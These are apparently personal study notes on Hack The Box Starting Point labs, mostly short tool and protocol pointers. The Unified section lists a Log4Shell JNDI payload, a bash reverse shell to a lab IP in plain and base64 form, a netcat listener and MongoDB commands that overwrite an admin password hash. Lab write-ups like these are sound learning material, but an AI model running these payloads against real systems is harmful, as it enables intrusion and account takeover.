---
alias: hacktehbox
type: documentation-writeup
---
[[CS caputetheflag]]

### Starting Point Tier 0 - Meow

[[htb_labsWriteUps_startingPoint_meow.pdf]]

when using [[NT telnet]] root can log in without a password, if enabled

### Starting Point Tier 0 - Fawn

[[htb_labsWriteUps_startingPoint_fawn.pdf]]

[[NT FTP]] when not correctly secured can have log in with "anonymous"

`sudo apt install smbclient`

### Starting Point Tier 0 - Dancing

[[htb_labsWriteUps_startingPoint_dancing.pdf]]

[[NT SMB]] && [[IT NETBios]] are often used together so that is why they will show up on the [[,nmap]] port scan together

![[Pasted image 20240912202001.png]]

### Starting Point : Tier 0 - Redeemer

[[htb_labsWriteUps_startingPoint_redeemer.pdf]]


### Starting Point : Tier 1 - Appointment

[[htb_labsWriteUps_startingPoint_appointment.pdf]]

[[IT SQL Injection]]
[[,apache]]
[[NT HTTP]]

apache version 2.4.38 --> [vulnerabilities](https://httpd.apache.org/security/vulnerabilities_24.html)


### Starting Point: Tier 3 - Unified

[[htb-machines-startingpoint3-unified.pdf]]

exploits: [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) 

used tools

[[,burpsuite]]
[[,nmap]]
[[,maven]]
[[LX tcpdump|tcpdump]]

technologies mentioned

[[PR Log4J]]
[[IT Unifi]]
[[IT JNDI]]
[[IT MongoDB]]
[[NT LDAP]]


|                                                                                                                                                                                         |                                                                                                                                                                                                                                               |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `nmap -sC - sV -v {target-ip}`                                                                                                                                                          | -sC: Performs a script scan using the default set of scripts. It is equivalent to --<br>script=default.<br>-sV: Version detection<br>-v: Increases the verbosity level, causing Nmap to print more information about the<br>scan in progress. |
| `${jndi:ldap://{Tun0 IP Address}/o=tomcat}`                                                                                                                                             |                                                                                                                                                                                                                                               |
| `echo 'bash -c bash -i >&/dev/tcp/10.211.55.11/4444 0>&1' \| base64`                                                                                                                    | encode a command in base64                                                                                                                                                                                                                    |
| `java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuODcvNDQ0NCAwPiYxCg==} \| {base64,-d}\|{bash,-i}" --hostname "10.10.15.87"` | command to start LDAP server                                                                                                                                                                                                                  |
| `script -qc /bin/bash /dev/null`                                                                                                                                                        | get a bash shell in terminal                                                                                                                                                                                                                  |
| `nc -lvp <port>`                                                                                                                                                                        | use netcat to listen on a port for [[CS reverse shell]]                                                                                                                                                                                       |
| `mkpasswd -m sha-512 Password1234`                                                                                                                                                      | hash a password with sha-512 encryption                                                                                                                                                                                                       |
| `mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`                                                                                                                   | show all records in database ace                                                                                                                                                                                                              |
| `mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'`                                           | update the admin password with the generated hash                                                                                                                                                                                             |

[[IT JNDI]] = [Java Naming and Directory Interface](http://www.oracle.com/technetwork/java/index-jsp-137536.html).

DNS canary tokens = trigger an alert every time a [[NT DNS|DNS]] resolution for a certain domain is requested [link](https://docs.canarytokens.org/guide/dns-token.html#creating-a-dns-canarytoken) 

It allows the user to display TCP/IP and other packets being
transmitted or received over a network to which the computer is attached.

the idea of this lab is to exploit a java logging library, insert malicious code into the logging so it can interact with the OS on which it is running

in this case we use the rogueJNDI github repo that is used to response with a malicious response when a request is asked

### Starting Point: Tier 3 - Included

technology used:
[[NT TFTP|TFTP]]
[[,apache|apache httpd]]

exploit/vulernability:
[[CS Local File Infusion]]

commands used:

| command        | info                                                                                               |
| -------------- | -------------------------------------------------------------------------------------------------- |
| `nmap -sV -Sc` | -C  -- specify lines of context<br>-s  -- suppress messages about unreadable or non-existent files |
|                |                                                                                                    |
`http://{target_IP}/?file=`

structure of the URL shows that a file is loaded to show the webpage in [[PR PHP]]